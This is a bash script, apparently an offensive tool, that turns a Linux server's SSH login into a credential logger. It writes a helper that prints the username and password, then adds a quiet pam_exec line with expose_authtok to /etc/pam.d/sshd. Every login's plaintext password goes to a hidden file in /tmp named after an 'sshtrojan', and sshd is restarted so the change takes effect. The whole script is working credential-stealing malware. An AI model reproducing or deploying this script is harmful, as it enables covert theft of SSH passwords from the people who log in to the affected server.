#! /usr/bin/env bash

# check if the script is run with root privilege
if [[ $EUID -ne 0 ]]; then
	echo "Need root privilege"
	exit 1
fi

file_exec="/root/pam_sshpwlog.sh"
file_log="/tmp/.log_sshtrojan1.txt"
file_pamsshd="/etc/pam.d/sshd"
file_pamsshd_backup="/etc/pam.d/sshd.backup"

choice="y"

# Check if exist file /etc/pam.d/sshd.backup
if [[ -f $file_pamsshd_backup ]]; then
	echo "Exist $file_pamsshd_backup"
	printf "\nDelete file (d)\tRestore file (r)\nDo nothing (y)\tExit (press enter)\n(d/r/n/[enter]): "
	read choice

	if [[ $choice == "d" ]]; then
		printf "\nType \"confirm\" to confirm delete (confirm/[other]): "
		read confirm

		if [[ $confirm == "confirm" ]]; then
			rm "$file_pamsshd_backup"
			echo "Deleted"
		else
			echo "Cancelled"
		fi

		printf "\nContinue? (y/[other]): "
		read choice

	elif [[ $choice == "r" ]]; then
		mv "$file_pamsshd_backup" "$file_pamsshd"
		echo "Restored"
		printf "\nContinue? (y/[other]): "
		read choice

	elif [[ $choice == "y" ]]; then
		:

	elif [[ -z $choice ]]; then
		echo "Exit"
		exit 0

	else
		echo "Wrong command"
		exit 1
	fi
fi

# Check if user want to continue
[[ $choice != "y" ]] && exit 0

# Script to read password
cat >$file_exec <<EOF1
#! /usr/bin/env bash

read password
printf "Username: \$PAM_USER\nPassword: \$password\n"
EOF1
chmod +x $file_exec
echo "Created script"

# Append config to /etc/pam.d/sshd allowing the script above to read password
cp "$file_pamsshd" "$file_pamsshd_backup"
cat >>$file_pamsshd <<EOF2

# Custom command
auth optional pam_exec.so expose_authtok quiet log=$file_log $file_exec
EOF2
echo "Added option to $file_pamsshd"

# Restart sshd for changes to take effect
service ssh restart
echo "Restarted sshd"
